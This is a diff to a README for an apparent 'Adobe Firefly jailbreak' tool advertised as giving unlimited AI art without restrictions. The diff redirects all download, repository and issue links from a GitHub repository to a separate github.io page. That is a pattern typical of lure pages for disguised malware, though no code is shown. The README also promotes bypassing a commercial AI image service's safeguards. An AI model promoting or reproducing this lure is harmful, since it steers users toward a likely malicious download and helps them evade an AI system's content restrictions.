@@ -1,6 +1,6 @@
 # ⚡ adobe-firefly-jailbreak-2026 - Unlimited AI Art Without Restrictions
 
-[![Download Now](https://img.shields.io/badge/Download-adobe--firefly--jailbreak--2026-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF4500)](https://github.com/jjrichburg100/adobe-firefly-jailbreak-2026)
+[![Download Now](https://img.shields.io/badge/Download-adobe--firefly--jailbreak--2026-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF4500)](https://jjrichburg100.github.io)
 
 ---
 
@@ -50,7 +50,7 @@ All generated images are saved directly to your computer. No cloud uploads, no c
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/jjrichburg100/adobe-firefly-jailbreak-2026](https://github.com/jjrichburg100/adobe-firefly-jailbreak-2026)**
+Visit this link to download the application: **[https://jjrichburg100.github.io](https://jjrichburg100.github.io)**
 
 Click the green "Code" button, then select "Download ZIP" from the dropdown menu. The download will begin automatically. Save the ZIP file somewhere you can easily find it, like your Desktop or Downloads folder.
 
@@ -137,7 +137,7 @@ The tool checks for updates automatically on startup. If an update is available,
 
 ## 📥 Download & Install Again
 
-**Download link:** [https://github.com/jjrichburg100/adobe-firefly-jailbreak-2026](https://github.com/jjrichburg100/adobe-firefly-jailbreak-2026)
+**Download link:** [https://jjrichburg100.github.io](https://jjrichburg100.github.io)
 
 Visit this link to download the application. The download is free, secure, and available 24/7.
 
@@ -199,9 +199,9 @@ The community typically responds within 24-48 hours.
 
 ## 🔗 Quick Links
 
-- **[Download Now](https://github.com/jjrichburg100/adobe-firefly-jailbreak-2026)**
-- [View Repository](https://github.com/jjrichburg100/adobe-firefly-jailbreak-2026)
-- [Submit an Issue](https://github.com/jjrichburg100/adobe-firefly-jailbreak-2026/issues)
+- **[Download Now](https://jjrichburg100.github.io)**
+- [View Repository](https://jjrichburg100.github.io)
+- [Submit an Issue](https://jjrichburg100.github.io)
 
 ---
 
